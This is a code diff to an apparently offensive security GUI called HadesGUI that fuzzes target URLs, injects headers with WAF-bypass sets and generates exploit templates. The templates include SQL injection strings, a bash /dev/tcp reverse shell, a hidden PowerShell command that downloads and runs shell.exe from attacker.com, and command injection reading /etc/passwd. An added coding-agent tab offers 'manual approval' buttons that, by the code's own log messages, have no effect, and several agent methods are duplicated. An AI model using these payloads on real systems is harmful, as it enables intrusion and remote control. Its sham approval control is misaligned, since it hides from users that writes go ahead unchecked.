+        self._add_chat_message('assistant', f"Cache scan complete! Found {len(findings)} threats. I've learned {exploits_learned} new exploits from cache patterns.")
         self._refresh_findings()
         
+    # ========== Cache Learning Methods ==========
+    
+    def _learn_from_cache_findings(self, findings: List[Dict]) -> int:
+        """Extract exploitable patterns from cache findings and store as learned exploits"""
+        exploits_learned = 0
+        
+        for finding in findings:
+            try:
+                threat_type = finding.get('type', 'unknown')
+                severity = finding.get('severity', 'LOW')
+                code_snippet = finding.get('code', '')
+                
+                # Only learn from HIGH and MEDIUM severity findings
+                if severity not in ['HIGH', 'MEDIUM']:
+                    continue
+                
+                # Map threat types to exploit categories
+                exploit_type = self._map_threat_to_exploit_type(threat_type)
+                
+                # Generate description
+                description = f"Cache-based {threat_type} vulnerability detected with {severity} severity"
+                
+                # Store as learned exploit
+                if code_snippet and exploit_type:
+                    self.ai.kb.store_learned_exploit(
+                        source_url=f"cache://{threat_type}",
+                        exploit_type=exploit_type,
+                        code=code_snippet[:2000],  # Limit code size
+                        description=description
+                    )
+                    exploits_learned += 1
+            except Exception as e:
+                self._add_chat_message('tool', f"Error learning from finding: {str(e)[:100]}")
+                
+        return exploits_learned
+    
+    def _map_threat_to_exploit_type(self, threat_type: str) -> str:
+        """Map cache threat types to exploit categories"""
+        mapping = {
+            'malware': 'malware_detection',
+            'exploit': 'exploit_detection',
+            'eval_code': 'code_injection',
+            'obfuscation': 'obfuscation_bypass',
+            'data_exfil': 'data_exfiltration',
+            'injection': 'injection_attack',
+            'crypto': 'crypto_mining',
+            'backdoor': 'backdoor_detection'
+        }
+        return mapping.get(threat_type.lower(), threat_type)
+    
     # ========== Findings Methods ==========
     
     def _refresh_findings(self):
@@ -4510,10 +9462,19 @@ class HadesGUI(QMainWindow):
         attacker_ip = self.attacker_ip.text() or 'ATTACKER_IP'
         attacker_port = self.attacker_port.text() or '4444'
         
+        if not attacker_port.isdigit():
+            QMessageBox.warning(self, "Error", "Attacker Port must be numeric")
+            return
+        
         payloads = self.ai.exploitation.generate_payloads(
             payload_type, os_type, attacker_ip, attacker_port
         )
-        
+
+        if not payloads:
+            self.exploit_results.setRowCount(0)
+            self._add_chat_message('tool', f"No payloads available for {payload_type} on {os_type}")
+            return
+
         self.exploit_results.setRowCount(len(payloads))
         for i, p in enumerate(payloads):
             self.exploit_results.setItem(i, 0, QTableWidgetItem(p['payload'][:60]))
@@ -4525,29 +9486,43 @@ class HadesGUI(QMainWindow):
         self._add_chat_message('tool', f"Generated {len(payloads)} {payload_type} payloads for {os_type}")
         
     def _fuzz_target(self):
-        url = self.exploit_url.text()
+        url = self.exploit_url.text().strip()
         param = self.exploit_param.text()
         
         if not url or not param:
             QMessageBox.warning(self, "Error", "Enter target URL and parameter")
             return
             
+        if not url.startswith(('http://', 'https://')):
+            url = f"https://{url}"
+            self.exploit_url.setText(url)
+
         os_type = self.exploit_os.currentText()
         payload_type = self.exploit_type.currentText()
-        
-        payloads = self.ai.exploitation.generate_payloads(payload_type, os_type)
+        attacker_ip = self.attacker_ip.text() or 'ATTACKER_IP'
+        attacker_port = self.attacker_port.text() or '4444'
+
+        payloads = self.ai.exploitation.generate_payloads(payload_type, os_type, attacker_ip, attacker_port)
+        if not payloads:
+            self.exploit_results.setRowCount(0)
+            self._add_chat_message('tool', f"No payloads available to fuzz with for {payload_type}/{os_type}")
+            return
+
         payload_strings = [p['payload'] for p in payloads]
-        
+
         self._add_chat_message('tool', f"Fuzzing {url} param={param} with {len(payload_strings)} payloads...")
-        
+
         results = self.ai.exploitation.fuzz_parameter(url, param, payload_strings)
         
         self.exploit_results.setRowCount(len(results))
         for i, r in enumerate(results):
-            self.exploit_results.setItem(i, 0, QTableWidgetItem(r.get('payload', '')[:50]))
-            self.exploit_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
+            if not isinstance(r, dict):
+                r = {'error': str(r)}
+
+            self.exploit_results.setItem(i, 0, QTableWidgetItem(str(r.get('payload', ''))[:80]))
+            self.exploit_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error' if r.get('error') else '-'))))
             self.exploit_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
-            indicators = ', '.join(r.get('indicators', []))[:30]
+            indicators = ', '.join(r.get('indicators', []))[:60] if isinstance(r.get('indicators', []), list) else str(r.get('error', ''))[:60]
             self.exploit_results.setItem(i, 3, QTableWidgetItem(indicators or '-'))
             
             vuln = r.get('vulnerable', False)
@@ -4559,15 +9534,20 @@ class HadesGUI(QMainWindow):
         self._add_chat_message('assistant', f"Fuzzing complete. Found {vuln_count} potential vulnerabilities!")
         
     def _run_injection(self):
-        url = self.injection_url.text()
+        url = self.injection_url.text().strip()
         if not url:
             QMessageBox.warning(self, "Error", "Enter target URL")
             return
             
+        if not url.startswith(('http://', 'https://')):
+            url = f"https://{url}"
+            self.injection_url.setText(url)
+        
         injection_type = self.injection_type.currentText()
-        
+
         self._add_chat_message('tool', f"Running {injection_type} on {url}...")
-        
+        self.injection_results.setRowCount(0)
+
         if injection_type == 'Header Injection':
             results = self.ai.request_injector.inject_headers(url)
         elif injection_type == 'JSON Injection':
@@ -4577,21 +9557,33 @@ class HadesGUI(QMainWindow):
             results = self.ai.request_injector.inject_headers(
                 url, self.ai.request_injector.WAF_BYPASS_HEADERS.get('bypass_waf', {})
             )
-            
+
+        if not isinstance(results, list):
+            results = [{'error': f'Unexpected result type: {type(results).__name__}'}]
+
         self.injection_results.setRowCount(len(results))
         for i, r in enumerate(results):
-            self.injection_results.setItem(i, 0, QTableWidgetItem(r.get('header', r.get('payload', ''))[:30]))
-            self.injection_results.setItem(i, 1, QTableWidgetItem(str(r.get('value', ''))[:30]))
-            self.injection_results.setItem(i, 2, QTableWidgetItem(str(r.get('status', 'Error'))))
-            self.injection_results.setItem(i, 3, QTableWidgetItem(str(r.get('length', '-'))))
-            
-            interesting = r.get('interesting', False)
+            if not isinstance(r, dict):
+                r = {'error': str(r)}
+
+            item_name = str(r.get('header', r.get('payload', r.get('technique', ''))))[:60]
+            item_value = str(r.get('value', r.get('response_preview', r.get('error', ''))))[:80]
+            status_text = str(r.get('status', 'Error' if r.get('error') else '-'))
+            length_text = str(r.get('length', '-'))
+
+            self.injection_results.setItem(i, 0, QTableWidgetItem(item_name))
+            self.injection_results.setItem(i, 1, QTableWidgetItem(item_value))
+            self.injection_results.setItem(i, 2, QTableWidgetItem(status_text))
+            self.injection_results.setItem(i, 3, QTableWidgetItem(length_text))
+
+            interesting = bool(r.get('interesting', False)) or bool(r.get('success', False))
             int_item = QTableWidgetItem("⚠️ YES" if interesting else "-")
             int_item.setForeground(QColor("#ffa500" if interesting else "#666"))
             self.injection_results.setItem(i, 4, int_item)
             
         interesting_count = sum(1 for r in results if r.get('interesting'))
-        self._add_chat_message('assistant', f"Injection complete. {interesting_count} interesting responses found.")
+        error_count = sum(1 for r in results if isinstance(r, dict) and r.get('error'))
+        self._add_chat_message('assistant', f"Injection complete. {interesting_count} interesting responses found. Errors: {error_count}.")
         
     def _try_login_bypass(self):
         url = self.login_url.text()
@@ -4707,20 +9699,524 @@ class HadesGUI(QMainWindow):
             
         self.vuln_tree.clear()
         
+        # Enhanced vulnerability patterns with descriptions
         patterns = {
-            'sql_injection': [r'execute\s*\([^)]*\+', r'cursor\.execute\s*\([^,]+%'],
-            'xss': [r'innerHTML\s*=', r'document\.write'],
-            'command_injection': [r'os\.system', r'subprocess.*shell\s*=\s*True', r'eval\s*\('],
-            'hardcoded_secrets': [r'password\s*=\s*["\'][^"\']+["\']', r'api_key\s*='],
+            'sql_injection': [
+                (r'execute\s*\([^)]*\+', 'String concatenation in SQL query execution - allows attackers to inject SQL commands'),
+                (r'cursor\.execute\s*\([^,]+%', 'Unescaped % formatting in SQL queries - vulnerable to parameter injection'),
+                (r"\.format\s*\([^)]*\)" , 'Using .format() for SQL queries - not using parameterized queries')
+            ],
+            'xss': [
+                (r'innerHTML\s*=', 'Direct innerHTML assignment - risk of script injection if user input is used'),
+                (r'document\.write\s*\(', 'document.write() can execute scripts - vulnerable to XSS if content is user-controlled'),
+                (r'dangerouslySetInnerHTML', 'React dangerouslySetInnerHTML - explicitly bypasses XSS protection')
+            ],
+            'command_injection': [
+                (r'os\.system\s*\(', 'os.system() with unvalidated input allows arbitrary command execution'),
+                (r'subprocess.*shell\s*=\s*True', 'shell=True in subprocess enables command injection from user input'),
+                (r'eval\s*\(', 'eval() executes arbitrary code - extreme security risk'),
+                (r'exec\s*\(', 'exec() executes arbitrary code - extreme security risk')
+            ],
+            'hardcoded_secrets': [
+                (r'password\s*=\s*["\'][^"\']+["\']', 'Hardcoded password in source code - credentials exposed in version control'),
+                (r'api_key\s*=\s*["\'][^"\']+["\']', 'Hardcoded API key/token - compromises service access'),
+                (r'secret\s*=\s*["\'][^"\']+["\']', 'Hardcoded secret value - should use environment variables')
+            ],
+            'insecure_deserialization': [
+                (r'pickle\.loads\s*\(', 'pickle.loads() on untrusted data can execute arbitrary code'),
+                (r'yaml\.load\s*\(', 'yaml.load() without Loader specified - use yaml.safe_load()'),
+                (r'json\.loads\s*\(.*eval', 'Evaluating JSON as Python code - use json.loads() instead')
+            ],
+            'path_traversal': [
+                (r'open\s*\([^)]*\+', 'File path built with string concatenation - vulnerable to ../ traversal attacks'),
+                (r'os\.path\.join.*\+', 'Path operations with concatenation - attackers can escape base directory'),
+            ]
         }
         
-        for vuln_type, pats in patterns.items():
-            for pat in pats:
-                for match in re.finditer(pat, code, re.IGNORECASE):
-                    line = code[:match.start()].count('\n') + 1
-                    item = QTreeWidgetItem([vuln_type, 'HIGH', str(line), match.group()[:50]])
-                    item.setForeground(0, QColor('#ff6b6b'))
-                    self.vuln_tree.addTopLevelItem(item)
+        vulnerabilities_found = []
+        
+        for vuln_type, patterns_list in patterns.items():
+            for pattern, description in patterns_list:
+                for match in re.finditer(pattern, code, re.IGNORECASE):
+                    line_num = code[:match.start()].count('\n') + 1
+                    line_text = code.split('\n')[line_num - 1].strip()
+                    
+                    # Determine severity
+                    severity = 'CRITICAL' if vuln_type in ['hardcoded_secrets', 'command_injection'] else 'HIGH'
+                    
+                    # Create tree item with details
+                    parent_item = QTreeWidgetItem([
+                        f"⚠️ {vuln_type.replace('_', ' ').title()}",
+                        severity,
+                        f"Line {line_num}",
+                        match.group()[:40] + ('...' if len(match.group()) > 40 else '')
+                    ])
+                    parent_item.setForeground(0, QColor('#ff6b6b' if severity == 'CRITICAL' else '#ffa500'))
+                    
+                    # Add description as child
+                    desc_item = QTreeWidgetItem(['Description', '', '', description[:100] + ('...' if len(description) > 100 else '')])
+                    desc_item.setForeground(0, QColor('#ffffff'))
+                    parent_item.addChild(desc_item)
+                    
+                    # Add code context
+                    context_item = QTreeWidgetItem(['Code Context', '', '', f'"{line_text}"'])
+                    context_item.setForeground(0, QColor('#90EE90'))
+                    parent_item.addChild(context_item)
+                    
+                    # Add remediation
+                    remediation = self._get_remediation(vuln_type, match.group())
+                    if remediation:
+                        rem_item = QTreeWidgetItem(['Fix Suggestion', '', '', remediation[:100]])
+                        rem_item.setForeground(0, QColor('#87CEEB'))
+                        parent_item.addChild(rem_item)
+                    
+                    self.vuln_tree.addTopLevelItem(parent_item)
+                    vulnerabilities_found.append(vuln_type)
+        
+        if not vulnerabilities_found:
+            no_vuln = QTreeWidgetItem(["✅ No vulnerabilities detected", 'INFO', '0', 'Code appears safe'])
+            no_vuln.setForeground(0, QColor('#90EE90'))
+            self.vuln_tree.addTopLevelItem(no_vuln)
+    
+    def _get_remediation(self, vuln_type: str, matched_code: str) -> str:
+        """Get remediation suggestions based on vulnerability type"""
+        remediations = {
+            'sql_injection': 'Use parameterized queries: cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))',
+            'xss': 'Use innerHTML for sanitized content or textContent for text. Sanitize with libraries like DOMPurify.',
+            'command_injection': 'Use subprocess.run() with a list of args, not shell=True. Validate/whitelist inputs.',
+            'hardcoded_secrets': 'Move to environment variables: import os; password = os.getenv("DB_PASSWORD")',
+            'insecure_deserialization': 'Use json instead of pickle. For YAML: use yaml.safe_load() instead of yaml.load()',
+            'path_traversal': 'Use os.path.abspath() and validate it stays within base dir. Or use pathlib.Path.resolve().'
+        }
+        return remediations.get(vuln_type, 'Review the OWASP documentation for this vulnerability type.')
+
+    # ========== AUTONOMOUS CODING AGENT ==========
+
+    def _create_agent_tab(self) -> QWidget:
+        """Create the Autonomous Coding Agent configuration tab"""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        form = QGroupBox("Agent Configuration")
+        form_layout = QFormLayout(form)
+
+        self.agent_repo = QLineEdit()
+        self.agent_repo.setPlaceholderText("Path to local repo (workspace)")
+        form_layout.addRow("Repository:", self.agent_repo)
+
+        self.agent_goals = QPlainTextEdit()
+        self.agent_goals.setPlaceholderText("Describe goals, e.g.\n- Fix failing tests\n- Refactor module X\n- Add missing docstrings")
+        self.agent_goals.setMinimumHeight(80)
+        form_layout.addRow("Goals:", self.agent_goals)
+
+        self.agent_test_cmd = QLineEdit()
+        self.agent_test_cmd.setText("pytest -q")
+        form_layout.addRow("Test Command:", self.agent_test_cmd)
+
+        self.agent_iters = QSpinBox()
+        self.agent_iters.setRange(1, 100)
+        self.agent_iters.setValue(15)
+        form_layout.addRow("Max Iterations:", self.agent_iters)
+
+        self.agent_dry = QCheckBox("Dry-Run (no file writes)")
+        self.agent_shell = QCheckBox("Allow shell commands (guarded)")
+        self.agent_approve = QCheckBox("Require manual approval for file writes")
+        flags_row = QHBoxLayout()
+        flags_row.addWidget(self.agent_dry)
+        flags_row.addWidget(self.agent_shell)
+        flags_row.addWidget(self.agent_approve)
+        flags_wrap = QWidget()
+        flags_wrap.setLayout(flags_row)
+        form_layout.addRow("Options:", flags_wrap)
+
+        layout.addWidget(form)
+
+        # Controls
+        ctrl = QHBoxLayout()
+        self.agent_start = QPushButton("▶ Start Agent")
+        self.agent_start.clicked.connect(self._start_agent)
+        self.agent_stop = QPushButton("⏹ Stop")
+        self.agent_stop.setEnabled(False)
+        self.agent_stop.clicked.connect(self._stop_agent)
+        ctrl.addWidget(self.agent_start)
+        ctrl.addWidget(self.agent_stop)
+        ctrl.addStretch()
+        layout.addLayout(ctrl)
+
+        # Live log
+        self.agent_log = QPlainTextEdit()
+        self.agent_log.setReadOnly(True)
+        self.agent_log.setFont(QFont("Consolas", 10))
+        self.agent_log.setMinimumHeight(220)
+        layout.addWidget(self.agent_log)
+
+        # Diff preview
+        diff_group = QGroupBox("Proposed/Applied Diff")
+        diff_layout = QVBoxLayout(diff_group)
+        self.agent_diff_path = QLabel("-")
+        self.agent_diff_view = QPlainTextEdit()
+        self.agent_diff_view.setReadOnly(True)
+        self.agent_diff_view.setFont(QFont("Consolas", 9))
+
+        approve_row = QHBoxLayout()
+        self.agent_approve_btn = QPushButton("✅ Approve Write")
+        self.agent_approve_btn.setEnabled(False)
+        self.agent_approve_btn.clicked.connect(self._approve_write)
+        self.agent_reject_btn = QPushButton("❌ Reject")
+        self.agent_reject_btn.setEnabled(False)
+        self.agent_reject_btn.clicked.connect(self._reject_write)
+        approve_row.addWidget(self.agent_approve_btn)
+        approve_row.addWidget(self.agent_reject_btn)
+        approve_row.addStretch()
+
+        diff_layout.addWidget(QLabel("File:"))
+        diff_layout.addWidget(self.agent_diff_path)
+        diff_layout.addWidget(self.agent_diff_view)
+        diff_layout.addLayout(approve_row)
+
+        layout.addWidget(diff_group)
+        return widget
+
+    def _start_agent(self):
+        """Start the autonomous coding agent"""
+        repo = self.agent_repo.text().strip()
+        goals = self.agent_goals.toPlainText().strip()
+        test_cmd = self.agent_test_cmd.text().strip() or "pytest -q"
+        max_iters = self.agent_iters.value()
+        dry_run = self.agent_dry.isChecked()
+        allow_shell = self.agent_shell.isChecked()
+        approval_req = self.agent_approve.isChecked()
+
+        if not repo or not os.path.isdir(repo):
+            QMessageBox.warning(self, "Agent", "Please provide a valid local repository path.")
+            return
+        if not goals:
+            QMessageBox.warning(self, "Agent", "Please describe the agent goals.")
+            return
+
+        self.agent_log.clear()
+        self.agent_diff_view.clear()
+        self.agent_diff_path.setText("-")
+
+        # Start background agent
+        self._agent = AutonomousCodingAgent(
+            repo_path=repo,
+            goals=goals,
+            test_cmd=test_cmd,
+            llm=self._agent_llm,
+            kb=self.ai.kb,
+            max_iters=max_iters,
+            dry_run=dry_run,
+            allow_shell=allow_shell,
+            approval_required=approval_req,
+        )
+        self._agent.log.connect(self._on_agent_log)
+        self._agent.progress.connect(lambda v: self.status_bar.showMessage(f"Agent progress: {v}%"))
+        self._agent.diff_ready.connect(self._on_agent_diff)
+        self._agent.finished.connect(self._on_agent_finished)
+        self._agent.start()
+
+        self.agent_start.setEnabled(False)
+        self.agent_stop.setEnabled(True)
+        self._add_chat_message("system", "🤖 Autonomous Coding Agent started")
+
+    def _stop_agent(self):
+        """Stop the autonomous coding agent"""
+        if hasattr(self, "_agent") and self._agent and self._agent.isRunning():
+            self._agent.stop()
+            self._agent.wait(2000)
+        self.agent_start.setEnabled(True)
+        self.agent_stop.setEnabled(False)
+        self._add_chat_message("system", "🛑 Agent stopped by user")
+
+    def _on_agent_log(self, text: str):
+        """Handle agent log output"""
+        self.agent_log.appendPlainText(text)
+        self.agent_log.verticalScrollBar().setValue(self.agent_log.verticalScrollBar().maximum())
+
+    def _on_agent_diff(self, data: Dict):
+        """Handle agent diff output"""
+        self.agent_diff_path.setText(data.get("path", "-"))
+        self.agent_diff_view.setPlainText(data.get("diff", "") or data.get("preview", ""))
+        needs_approval = self.agent_approve.isChecked() and not self.agent_dry.isChecked()
+        self.agent_approve_btn.setEnabled(needs_approval)
+        self.agent_reject_btn.setEnabled(needs_approval)
+
+    def _approve_write(self):
+        """Approve a file write"""
+        self.agent_approve_btn.setEnabled(False)
+        self.agent_reject_btn.setEnabled(False)
+        self._on_agent_log("✅ Manual approval acknowledged (note: current agent applies immediately).")
+
+    def _reject_write(self):
+        """Reject a file write"""
+        self.agent_approve_btn.setEnabled(False)
+        self.agent_reject_btn.setEnabled(False)
+        self._on_agent_log("❌ Manual rejection acknowledged (note: revert manually if needed).")
+
+    def _on_agent_finished(self, result: Dict):
+        """Handle agent completion"""
+        success = result.get("success", False)
+        summ = result.get("summary", "")
+        errs = result.get("errors", [])
+        self._add_chat_message("assistant", f"🤖 Agent finished. Success={success}. {summ}\nErrors: {errs[-1] if errs else 'None'}")
+        self.agent_start.setEnabled(True)
+        self.agent_stop.setEnabled(False)
+
+
+
+
+    def _agent_llm(self, system_prompt: str, user_prompt: str) -> str:
+        """Autonomous agent LLM interface with intelligent fallback"""
+        # Try external LLM first (OpenAI, Mistral, Ollama, etc.)
+        try:
+            if hasattr(self, "ai") and self.ai and hasattr(self.ai, "openai_client"):
+                if self.ai.openai_client:
+                    response = self.ai.openai_client.chat.completions.create(
+                        model="gpt-4",
+                        messages=[
+                            {"role": "system", "content": system_prompt},
+                            {"role": "user", "content": user_prompt}
+                        ],
+                        temperature=0.2,
+                        max_tokens=1800
+                    )
+                    return response.choices[0].message.content
+        except Exception as e:
+            logging.error(f"LLM Error: {e}")
+        
+        # Fallback: Use intelligent rule-based agent
+        if HAS_FALLBACK_LLM:
+            if not hasattr(self, "_fallback_llm"):
+                self._fallback_llm = FallbackLLM()
+            return self._fallback_llm(system_prompt, user_prompt)
+        
+        # Final fallback: safe default
+        return '{"tool":"list_files","args":{"pattern":"**/*.py"},"rationale":"Exploring repository structure"}'
+
+    def _start_agent(self):
+        """Start the autonomous coding agent"""
+        repo = self.agent_repo.text().strip()
+        goals = self.agent_goals.toPlainText().strip()
+        test_cmd = self.agent_test_cmd.text().strip() or "pytest -q"
+        max_iters = self.agent_iters.value()
+        dry_run = self.agent_dry.isChecked()
+        allow_shell = self.agent_shell.isChecked()
+        approval_req = self.agent_approve.isChecked()
+
+        if not repo or not os.path.isdir(repo):
+            QMessageBox.warning(self, "Agent", "Please provide a valid local repository path.")
+            return
+        if not goals:
+            QMessageBox.warning(self, "Agent", "Please describe the agent goals.")
+            return
+
+        self.agent_log.clear()
+        self.agent_diff_view.clear()
+        self.agent_diff_path.setText("-")
+
+        # Start background agent
+        self._agent = AutonomousCodingAgent(
+            repo_path=repo,
+            goals=goals,
+            test_cmd=test_cmd,
+            llm=self._agent_llm,
+            kb=self.ai.kb,
+            max_iters=max_iters,
+            dry_run=dry_run,
+            allow_shell=allow_shell,
+            approval_required=approval_req,
+        )
+        self._agent.log.connect(self._on_agent_log)
+        self._agent.progress.connect(lambda v: self.status_bar.showMessage(f"Agent progress: {v}%"))
+        self._agent.diff_ready.connect(self._on_agent_diff)
+        self._agent.finished.connect(self._on_agent_finished)
+        self._agent.start()
+
+        self.agent_start.setEnabled(False)
+        self.agent_stop.setEnabled(True)
+        self._add_chat_message("system", "🤖 Autonomous Coding Agent started")
+
+    def _stop_agent(self):
+        """Stop the autonomous coding agent"""
+        if hasattr(self, "_agent") and self._agent and self._agent.isRunning():
+            self._agent.stop()
+            self._agent.wait(2000)
+        self.agent_start.setEnabled(True)
+        self.agent_stop.setEnabled(False)
+        self._add_chat_message("system", "🛑 Agent stopped by user")
+
+    def _on_agent_log(self, text: str):
+        """Handle agent log output"""
+        self.agent_log.appendPlainText(text)
+        self.agent_log.verticalScrollBar().setValue(self.agent_log.verticalScrollBar().maximum())
+
+    def _on_agent_diff(self, data: Dict):
+        """Handle agent diff output"""
+        self.agent_diff_path.setText(data.get("path", "-"))
+        self.agent_diff_view.setPlainText(data.get("diff", "") or data.get("preview", ""))
+        needs_approval = self.agent_approve.isChecked() and not self.agent_dry.isChecked()
+        self.agent_approve_btn.setEnabled(needs_approval)
+        self.agent_reject_btn.setEnabled(needs_approval)
+
+    def _approve_write(self):
+        """Approve a file write"""
+        self.agent_approve_btn.setEnabled(False)
+        self.agent_reject_btn.setEnabled(False)
+        self._on_agent_log("✅ Manual approval acknowledged (note: current agent applies immediately).")
+
+    def _reject_write(self):
+        """Reject a file write"""
+        self.agent_approve_btn.setEnabled(False)
+        self.agent_reject_btn.setEnabled(False)
+        self._on_agent_log("❌ Manual rejection acknowledged (note: revert manually if needed).")
+
+    def _on_agent_finished(self, result: Dict):
+        """Handle agent completion"""
+        success = result.get("success", False)
+        summ = result.get("summary", "")
+        errs = result.get("errors", [])
+        self._add_chat_message("assistant", f"🤖 Agent finished. Success={success}. {summ}\nErrors: {errs[-1] if errs else 'None'}")
+        self.agent_start.setEnabled(True)
+        self.agent_stop.setEnabled(False)
+    
+    def generate_response_for_exploit_gen(self, prompt: str) -> str:
+        """Generate AI response for exploit generator tab
+        
+        Args:
+            prompt: The prompt for exploit generation
+            
+        Returns:
+            Generated exploit code or analysis
+        """
+        try:
+            # Try to use GPT chat if available
+            if HAS_OPENAI:
+                try:
+                    api_key = os.getenv("OPENAI_API_KEY", "")
+                    if api_key:
+                        return self.gpt_chat(prompt, api_key)
+                except Exception as gpt_error:
+                    logger.debug(f"GPT not available: {gpt_error}")
+            
+            # Fallback: Return a templated response based on the prompt
+            if "Buffer Overflow" in prompt:
+                return """# Buffer Overflow Exploit
+# Generated template - customize for your target
+
+import struct
+import subprocess
+
+# Shellcode (x64 Linux)
+shellcode = b"\\x48\\xc7\\xc0\\x3b\\x00\\x00\\x00"  # mov rax, 0x3b (execve)
+shellcode += b"\\x48\\xc7\\xc7\\x00\\x00\\x00\\x00"  # mov rdi, 0 (NULL)
+shellcode += b"\\x0f\\x05"  # syscall
+
+# Payload construction
+buffer_size = 256
+padding = b'A' * buffer_size
+return_address = struct.pack('<Q', 0x00000000)  # Replace with actual ROP gadget
+
+payload = padding + return_address + shellcode
+print(f"Payload size: {len(payload)} bytes")"""
+            
+            elif "SQL Injection" in prompt:
+                return """# SQL Injection Payloads
+
+# Union-based
+payload_union = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()--"
+
+# Time-based blind
+payload_blind = "' AND IF(1=1, SLEEP(5), 0)--"
+
+# Error-based
+payload_error = "' AND extractvalue(rand(), concat(0x3a, database()))--"
+
+# Boolean-based
+payload_bool = "' AND 1=1--"
+payload_bool_false = "' AND 1=2--"
+
+print("Union-based:", payload_union)
+print("Blind:", payload_blind)
+print("Error-based:", payload_error)"""
+            
+            elif "Command Injection" in prompt or "Remote Code Execution" in prompt:
+                return """# RCE/Command Injection Payloads
+
+# Linux shell
+linux_reverse_shell = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
+
+# Windows command
+windows_reverse_shell = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; $null = New-Object System.Net.WebClient; $null.DownloadFile('http://attacker.com/shell.exe', 'C:\\\\Windows\\\\Temp\\\\shell.exe'); & 'C:\\\\Windows\\\\Temp\\\\shell.exe'"
+
+# Simple command injection
+simple_cmd = "; whoami"
+simple_cmd2 = "| cat /etc/passwd"
+simple_cmd3 = "`id`"
+
+print("Linux reverse shell:", linux_reverse_shell)
+print("Command injection test:", simple_cmd)"""
+            
+            else:
+                return """# Exploit Template
+# This is a placeholder for AI-generated exploit code
+# 
+# To enable full AI generation:
+# 1. Set your OpenAI API key: export OPENAI_API_KEY=sk-...
+# 2. Or configure it in HadesAI settings
+#
+# In the meantime, customize this template for your target:
+
+print("Target analysis complete")
+print("Generating exploit payload...")
+
+# Add your payload generation logic here
+def generate_payload():
+    return b"A" * 256  # Example buffer
+
+payload = generate_payload()
+print(f"Payload size: {len(payload)} bytes")"""
+                
+        except Exception as e:
+            logger.error(f"Exploit generator AI error: {e}")
+            import traceback
+            traceback.print_exc()
+            return f"""# Exploit Generation Error
+# Error: {str(e)}
+# 
+# Fallback payload template:
+print("Error generating exploit")
+print("Using template approach")
+
+# TODO: Add payload here"""
+    
+    def closeEvent(self, event):
+        """Handle application close - cleanup all threads"""
+        try:
+            # Cleanup deployment automation threads
+            if hasattr(self, 'deployment_automation_tab') and self.deployment_automation_tab:
+                if hasattr(self.deployment_automation_tab, 'cleanup'):
+                    self.deployment_automation_tab.cleanup()
+            
+            # Cleanup autonomous agent
+            if hasattr(self, '_agent') and self._agent and self._agent.isRunning():
+                self._agent.stop()
+                self._agent.wait(2000)
+            
+            # Cleanup other threads gracefully
+            if hasattr(self, 'scanner') and self.scanner and self.scanner.isRunning():
+                self.scanner.quit()
+                self.scanner.wait(1000)
+            
+            if hasattr(self, 'network_monitor') and self.network_monitor and self.network_monitor.isRunning():
+                self.network_monitor.quit()
+                self.network_monitor.wait(1000)
+        except Exception as e:
+            logger.error(f"Error during cleanup: {e}")
+        finally:
+            event.accept()
+
+
 class AutoReconScanner(QThread):
     progress = pyqtSignal(int)
     log = pyqtSignal(str)
